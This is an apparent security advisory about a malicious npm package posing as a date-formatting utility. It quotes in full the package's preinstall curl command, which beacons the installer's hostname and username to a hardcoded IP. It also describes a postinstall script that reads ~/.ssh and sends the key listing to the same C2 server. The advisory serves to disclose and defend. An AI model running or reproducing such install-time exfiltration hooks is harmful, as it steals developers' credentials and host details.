summary: Malicious package: install-time host beacon and SSH key exfiltration to hardcoded C2
details: Package masquerades as a date formatting utility but ships install-time exfiltration code targeting installer hosts. package.json line 7 declares a preinstall script that runs `curl http://124.221.154.135/pre?h=$(hostname)&u=$(whoami)`, automatically sending the installer's hostname and OS username to a bare-IP attacker endpoint over plain HTTP on every `npm install`. The bundled postinstall.js reads `~/.ssh`, enumerates key files, builds a payload containing the username, platform, and SSH key listing, and POSTs the data to the same IP (124.221.154.135) — Chinese-language comments in the file explicitly identify the destination as a C2 server ("正在向 C2 服务器发送数据"). The shipped index.js is a trivial 5-line stub serving as cover. This is a coordinated install-time dropper aimed at host reconnaissance and SSH credential theft.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
